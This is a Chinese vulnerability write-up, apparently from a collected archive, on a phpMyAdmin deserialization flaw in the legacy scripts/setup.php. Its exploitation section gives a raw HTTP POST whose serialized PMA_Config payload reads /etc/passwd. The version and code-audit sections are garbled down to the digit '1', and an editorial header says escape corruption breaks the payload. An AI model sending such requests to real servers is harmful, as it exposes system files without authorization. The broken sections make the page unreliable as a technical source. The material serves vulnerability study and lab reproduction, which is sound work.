---
source: "MrWQ/vulnerability-paper"
title: "phpmyadmin 反序列化漏洞（WooYun-2016-199433）"
product: "phpMyAdmin"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "可访问旧版 scripts/setup.php；影响版本与鉴权条件缺失"
source_status: "unknown"
side_effects: "原文未完整记录副作用、清理步骤或运行验证；阅读样例不等于获准在真实系统执行。"
id: "vw-3cbc23ca4ce70ad11040979a"
entity_id: "ve-3cbc23ca4ce70ad11040979a"
schema_version: "1"
---

# phpmyadmin 反序列化漏洞（WooYun-2016-199433）

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：可访问旧版 scripts/setup.php；影响版本与鉴权条件缺失
- 证据范围：版本及代码审计章节只剩数字1；序列化字符串含转义下划线且 source 后用逗号，按正文复制不能作为有效 PoC

### 本次正文校订

- 按实际内容修正 1 处代码围栏语言标记，保留其中方法与请求内容。

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- 转义污染破坏 PMA_Config 类名及 HTTP 通配符
- 版本/原理章节丢失
- 复现结果依赖未视检外链图

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

<meta name="referrer" content="no-referrer"/>

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [www.cnblogs.com](https://www.cnblogs.com/xhds/archive/2004/01/13/12579425.html)

**目录**

*   [简介](#_label0)
*   [影响版本](#_label1)
*   [代码审计](#_label2)
*   [利用过程](#_label3)

[回到顶部](#_labelTop)

简介
--

**环境复现：**https://github.com/vulhub/vulhub

**线上平台:** 榆林学院内可使用协会内部的网络安全实验平台

phpMyAdmin 是一套开源的、基于 Web 的 MySQL 数据库管理工具

[回到顶部](#_labelTop)

影响版本
----

1 1

[回到顶部](#_labelTop)

代码审计
----

1

[回到顶部](#_labelTop)

利用过程
----

```
http://192.168.52.129:8080/scripts/setup.php

```

发送如下数据包，即可读取`/etc/passwd`

`[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")`

```http
POST /scripts/setup.php HTTP/1.1
Host: your-ip:8080
Accept-Encoding: gzip, deflate
Accept: \*/\*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 80

action=test&configuration=O:10:"PMA\_Config":1:{s:6:"source",s:11:"/etc/passwd";}

```

`[![](http://common.cnblogs.com/images/copycode.gif)](javascript:void(0); "复制代码")`

![](https://img2020.cnblogs.com/blog/967964/202003/967964-20200327095005500-1274656986.png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
